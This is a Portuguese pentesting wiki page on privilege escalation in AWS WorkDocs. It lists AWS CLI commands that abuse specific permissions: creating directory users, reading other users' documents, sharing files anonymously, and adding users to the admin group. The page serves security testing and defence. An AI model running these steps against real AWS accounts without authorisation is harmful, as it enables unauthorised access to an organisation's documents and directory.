# AWS - Escalação de Privilégios no WorkDocs

## WorkDocs

Para mais informações sobre o WorkDocs, consulte:

{% content-ref url="../../aws-pentesting/aws-services/aws-directory-services-workdocs-enum.md" %}
[aws-directory-services-workdocs-enum.md](../../aws-pentesting/aws-services/aws-directory-services-workdocs-enum.md)
{% endcontent-ref %}

### `workdocs:CreateUser`

Crie um usuário dentro do diretório indicado e, em seguida, você terá acesso tanto ao WorkDocs quanto ao AD:

```bash
# Crie um usuário (criado dentro do AD)
aws workdocs create-user --username testingasd --given-name testingasd --surname testingasd --password <password> --email-address name@directory.domain --organization-id <directory-id>
```

### `workdocs:GetDocument`, `(workdocs:`DescribeActivities`)`

Os arquivos podem conter informações sensíveis, leia-os:

```bash
# Obtenha o que foi criado no diretório
aws workdocs describe-activities --organization-id <directory-id>

# Obtenha o que cada usuário criou
aws workdocs describe-activities --user-id "S-1-5-21-377..."

# Obtenha o arquivo (será recuperada uma URL para acessar o conteúdo)
aws workdocs get-document --document-id <doc-id>
```

### `workdocs:AddResourcePermissions`

Se você não tem acesso para ler algo, você pode simplesmente concedê-lo

```bash
# Adicione permissão para que qualquer pessoa possa ver o arquivo
aws workdocs add-resource-permissions --resource-id <id> --principals Id=anonymous,Type=ANONYMOUS,Role=VIEWER
## Isso dará um ID, o arquivo será acessível em: https://<name>.awsapps.com/workdocs/index.html#/share/document/<id>
```

### `workdocs:AddUserToGroup`

Você pode tornar um usuário administrador definindo-o no grupo ZOCALO\_ADMIN.\
Para isso, siga as instruções em [https://docs.aws.amazon.com/workdocs/latest/adminguide/manage\_set\_admin.html](https://docs.aws.amazon.com/workdocs/latest/adminguide/manage\_set\_admin.html)

Faça login com esse usuário no workdoc e acesse o painel de administração em `/workdocs/index.html#/admin`

Não encontrei nenhuma maneira de fazer isso a partir da linha de comando.